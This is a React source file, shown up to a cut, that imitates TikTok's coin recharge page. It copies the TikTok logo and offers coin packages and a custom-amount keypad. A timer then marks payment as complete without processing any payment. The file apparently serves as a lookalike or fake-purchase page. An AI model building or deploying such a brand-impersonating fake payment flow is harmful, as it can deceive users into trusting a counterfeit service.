import { useState, useRef, useEffect } from "react";
import "./App.css";

function App() {
  const completeRef = useRef();
  const modalRef = useRef();
  const divRef = useRef();
  const [modal, setModal] = useState(false);
  const [totalPrice, setTotalPrice] = useState("0.00");
  const [inputValue, setInputValue] = useState("");
  const [payment, setPayment] = useState(false);
  const [secondsRemaining, setSecondsRemaining] = useState(-1);
  const [countDownModal, setCountDownModal] = useState(false);
  const [isCountdownStarted, setIsCountdownStarted] = useState(false);
  const [username, setUsername] = useState("");
  const [paymentComplete, setPaymentComplete] = useState(false);

  const handleButtonClick = (value) => {
    setInputValue((prevValue) => {
      const newValue = prevValue + value;
      const number = newValue.replace(/\D/g, "");
      const formattedNumber = number.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      return formattedNumber;
    });
  };

  const handleStartCountdown = () => {
    setPayment(false);
    setCountDownModal(true);
    setIsCountdownStarted(true);
  };

  const calculateTotalPrice = () => {
    let numericValue = 0;

    if (inputValue !== "") {
      const number = inputValue.replace(/,/g, "");
      if (/^\d+$/.test(number)) {
        numericValue = parseFloat(number);
      }
    }

    let roundedPrice;

    if (numericValue * 0.0115 > 10) {
      roundedPrice = Math.round(numericValue * 0.0115).toFixed(2);
    } else {
      roundedPrice = (numericValue * 0.0115).toFixed(2);
    }

    setTotalPrice(roundedPrice);
  };

  useEffect(() => {
    calculateTotalPrice();
  }, [inputValue]);

  useEffect(() => {
    let interval = null;

    if (isCountdownStarted) {
      setSecondsRemaining(6); // Reinicia la cuenta regresiva a 5 segundos
      interval = setInterval(() => {
        setSecondsRemaining((prevSeconds) => prevSeconds - 1);
      }, 1000);
    } else {
      clearInterval(interval); // Detiene la cuenta regresiva si no está activada
    }

    return () => clearInterval(interval); // Limpiar el intervalo al desmontar el componente
  }, [isCountdownStarted]);

  useEffect(() => {
    if (secondsRemaining === 0) {
      setCountDownModal(false);
      setPaymentComplete(true);
      setSecondsRemaining(-1);
    }
  }, [secondsRemaining]);

  const handleDeleteButtonClick = () => {
    setInputValue((prevValue) => {
      const newValue = prevValue.slice(0, -1); // Eliminar el último dígito del valor
      const formattedValue = newValue
        .replace(/\D/g, "")
        .replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      return formattedValue;
    });
  };

  const selectedCard = (coins, price) => {
    setInputValue(coins);
    setTotalPrice(price);
    setPayment(true);
  };

  const handleInputChange = (e) => {
    const number = e.target.value.replace(/\D/g, "");
    const formattedNumber = number.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    setInputValue(formattedNumber);
  };

  const modalCustom = () => {
    setModal(!modal);
  };

  const handleClickOutside = (event) => {
    if (divRef.current && !divRef.current.contains(event.target) && modal) {
      setModal(false);
    }
  };

  const handleChangeUsername = (e) => {
    setUsername(e.target.value);
  };

  // Calcula los minutos y segundos restantes
  const minutesRemaining = 4;
  const seconds = 53 + secondsRemaining;

  return (
    <>
      <div className="headerContainer h-[60px] flex justify-around w-full">
        {/* NAV */}
        <div className="w-full h-full flex flex-row  justify-between items-center pr-6 pl-5 ">
          <div>
            <a aria-label="Go to TikTok For You feed" href="/">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 118 42"
                width="118"
                height="42"
                alt="TikTok"
              >
                <path
                  fill="#25F4EE"
                  d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"
                ></path>
                <path
                  fill="#25F4EE"
                  d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"
                ></path>
                <path
                  fill="#FE2C55"
                  d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"
                ></path>
                <path
                  fill="#FE2C55"
                  d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"
                ></path>
                <path
                  fill="black"
                  d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"
                ></path>
                <path
                  fill="#25F4EE"
                  d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"
                ></path>
                <path
                  fill="#FE2C55"
                  d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"
                ></path>
                <path
                  fill="black"
                  d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"
                ></path>
              </svg>
            </a>
          </div>
          <div className="flex items-center">
            <div>
              <a href="/" className=" upload font-bold text-base spacing ">
                <div className="uploadContainer px-4 h-9 rounded-sm items-center flex justify-center bg-white ">
                  <svg
                    className=" h-5 w-5 mr-2"
                    width="1em"
                    data-e2e=""
                    height="1em"
                    viewBox="0 0 16 16"
                    fill="currentColor"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path d="M8 2.5C7.58579 2.5 7.25 2.83579 7.25 3.25V7.25H3.25C2.83579 7.25 2.5 7.58579 2.5 8C2.5 8.41421 2.83579 8.75 3.25 8.75H7.25V12.75C7.25 13.1642 7.58579 13.5 8 13.5C8.41421 13.5 8.75 13.1642 8.75 12.75V8.75H12.75C13.1642 8.75 13.5 8.41421 13.5 8C13.5 7.58579 13.1642 7.25 12.75 7.25H8.75V3.25C8.75 2.83579 8.41421 2.5 8 2.5Z"></path>
                  </svg>
                  <span className=" font-semibold text-base "> Upload</span>
                </div>
              </a>
            </div>
            <div className=" ml-4 cursor-pointer h-8 px-[3px] pt-[3px] pb-0 ">
              <a href="/" className="">
                <span>
                  <svg
                    className=" w-[26px] h-[26px] "
                    width="1em"
                    data-e2e=""
                    height="1em"
                    viewBox="0 0 48 48"
                    fill="currentColor"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path d="M2.17877 7.17357C2.50304 6.45894 3.21528 6 4.00003 6H44C44.713 6 45.372 6.37952 45.7299 6.99615C46.0877 7.61278 46.0902 8.37327 45.7365 8.99228L25.7365 43.9923C25.3423 44.6821 24.5772 45.0732 23.7872 44.9886C22.9972 44.9041 22.3321 44.3599 22.0929 43.6023L16.219 25.0017L2.49488 9.31701C1.97811 8.72642 1.85449 7.88819 2.17877 7.17357ZM20.377 24.8856L24.531 38.0397L40.5537 10H8.40757L18.3918 21.4106L30.1002 14.2054C30.5705 13.9159 31.1865 14.0626 31.4759 14.533L32.5241 16.2363C32.8136 16.7066 32.6669 17.3226 32.1966 17.612L20.377 24.8856Z"></path>
                  </svg>
                </span>
              </a>
            </div>
            <div className="ml-4">
              <span>
                <svg
                  className=" cursor-pointer text-black"
                  width="32"
                  data-e2e=""
                  height="32"
                  viewBox="0 0 32 32"
                  fill="currentColor"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    fillRule="evenodd"
                    clipRule="evenodd"
                    d="M24.0362 21.3333H18.5243L15.9983 24.4208L13.4721 21.3333H7.96047L7.99557 8H24.0009L24.0362 21.3333ZM24.3705 23.3333H19.4721L17.2883 26.0026C16.6215 26.8176 15.3753 26.8176 14.7084 26.0026L12.5243 23.3333H7.62626C6.70407 23.3333 5.95717 22.5845 5.9596 21.6623L5.99646 7.66228C5.99887 6.74352 6.74435 6 7.66312 6H24.3333C25.2521 6 25.9975 6.7435 26 7.66224L26.0371 21.6622C26.0396 22.5844 25.2927 23.3333 24.3705 23.3333ZM12.6647 14C12.2965 14 11.998 14.2985 11.998 14.6667V15.3333C11.998 15.7015 12.2965 16 12.6647 16H19.3313C19.6995 16 19.998 15.7015 19.998 15.3333V14.6667C19.998 14.2985 19.6995 14 19.3313 14H12.6647Z"
                  ></path>
                </svg>
              </span>
            </div>
          </div>
        </div>
      </div>
      <div className="flex mt-2 text-black px-2 w-full ">
        <div className=" flex flex-col w-full gap-2">
          <div className="w-full flex justify-between ">
            <h1 className="font-bold text-2xl">Recharge</h1>
            <span className=" text-sm font-medium self-end">
              View transaction history
            </span>
          </div>
          <div className=" bg-[#F6F6F6] "></div>
          <div className=" ">
            <div className=" flex w-1/3 flex-wrap items-stretch">
              <input
                type="search"
                className=" rounded-2xl  block flex-auto  border border-solid border-neutral-300 bg-[#F6F6F6] bg-clip-padding px-3 py-[0.25rem]  font-normal outline-none  focus:z-[3] focus:border-primary focus:text-neutral-700 focus:shadow-[inset_0_0_0_1px_rgb(59,113,202)] focus:outline-none "
                value={username}
                placeholder="Enter Username"
                aria-label="Search"
                onChange={handleChangeUsername}
              />
            </div>
          </div>
        </div>
      </div>

      {/* COINS */}
      <div className=" lg:justify-center flex lg:flex-row mx-auto flex-col flex-wrap">
        <div
          id="card1"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("70", 0.8)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">70</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 0.80</p>
          </div>
        </div>
        <div
          id="card2"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("350", 3.99)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">350</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 3.99</p>
          </div>
        </div>
        <div
          id="card3"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("700", 7.98)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">700</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 7.98</p>
          </div>
        </div>
        <div
          id="card4"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("1,400", 15.96)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">1,400</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 15.96</p>
          </div>
        </div>
        <div
          id="card5"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("3,500", 39.9)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">3,500</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 39.9</p>
          </div>
        </div>
        <div
          id="card5"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("7,000", 79.8)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">7,000</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 79.8</p>
          </div>
        </div>
        <div
          id="card7"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 mx-2 lg:w-1/5 flex flex-col justify-center items-center  cursor-pointer"
          onClick={() => selectedCard("17,500", 199.3)}
        >
          <div className=" flex items-center">
            <svg
              className=""
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">17,500</p>
          </div>
          <div>
            <p className="car font-bold leading-4 text-gray-400">$ 199.3</p>
          </div>
        </div>
        <div
          id="card8"
          className="card mt-6 gap-1 border-solid rounded-sm border-2 h-24 lg:w-1/5 flex flex-col justify-center items-center mx-2 cursor-pointer border-yellow-300 outline-yellow-400 "
          onClick={modalCustom}
        >
          <div className="flex  justify-center">
            <svg
              className="coin"
              width="2rem"
              data-e2e=""
              height="2rem"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
              <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                fill="#FABC15"
              ></path>
              <path
                d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                fill="#FEF5CD"
              ></path>
            </svg>
            <p className="pl-1  text-2xl -mt-1 font-bold">Custom</p>
          </div>
          <div>
            <p className="car font-bold text-base leading-4 text-gray-400">
              Large amount supported
            </p>
          </div>
        </div>
      </div>

      <div className="mb-8"></div>

      {/* MODAL */}
      <div
        id="popup"
        className={
          modal
            ? "flex fixed inset-0  flex-wrap items-center justify-center bg-black bg-opacity-50"
            : "hidden"
        }
        ref={modalRef}
        onClick={handleClickOutside}
      >
        <div
          ref={divRef}
          id="popupBox"
          className="bg-white py-5 px-1 rounded-lg w-2/3 min-h-1/3 animate__animated animate__bounceIn animate__slow-1s"
        >
          <div className="w-full h-full flex flex-col  gap-4">
            <div className=" flex w-full justify-between items-center  px-4">
              <span className="font-bold text-xl flex-grow text-center ">
                Custom
              </span>
              <span
                className=" text-right font-bold  cursor-pointer"
                onClick={() => {
                  setModal(false);
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="fill-zinc-500"
                  width="32px"
                  height="32px"
                  viewBox="0 0 32 32"
                >
                  <path d="M18.8,16l5.5-5.5c0.8-0.8,0.8-2,0-2.8l0,0C24,7.3,23.5,7,23,7c-0.5,0-1,0.2-1.4,0.6L16,13.2l-5.5-5.5  c-0.8-0.8-2.1-0.8-2.8,0C7.3,8,7,8.5,7,9.1s0.2,1,0.6,1.4l5.5,5.5l-5.5,5.5C7.3,21.9,7,22.4,7,23c0,0.5,0.2,1,0.6,1.4  C8,24.8,8.5,25,9,25c0.5,0,1-0.2,1.4-0.6l5.5-5.5l5.5,5.5c0.8,0.8,2.1,0.8,2.8,0c0.8-0.8,0.8-2.1,0-2.8L18.8,16z" />
                </svg>
              </span>
            </div>
            <div className="px-2 mt-4">
              <div className="flex w-full h-10 gap-1 items-center px-2 rounded-xl bg-gray-200 bg-opacity-50">
                <span>
                  <svg
                    className="coin"
                    width="1.8rem"
                    data-e2e=""
                    height="1.8rem"
                    viewBox="0 0 48 48"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle>
                    <circle cx="24" cy="24" r="17" fill="#FACE15"></circle>
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z"
                      fill="#FABC15"
                    ></path>
                    <path
                      d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z"
                      fill="#FEF5CD"
                    ></path>
                  </svg>
                </span>
                <input
                  id="amountPersonalized"
                  type="text"
                  placeholder="80 - 2,500.000"
                  className="w-full bg-gray-200 outline-none bg-opacity-50 font-bold"
                  value={inputValue}
                  onChange={handleInputChange}
                />
              </div>
            </div>
            <div className="grid grid-cols-4 grid-rows-3 gap-4 px-2 mt-4">
              {/**BOTONES */}
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => {
                  handleButtonClick("1");
                }}
              >
                1
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("2")}
              >
                2
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("3")}
              >
                3
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleDeleteButtonClick()}
              >
                DEL
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("4")}
              >
                4
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
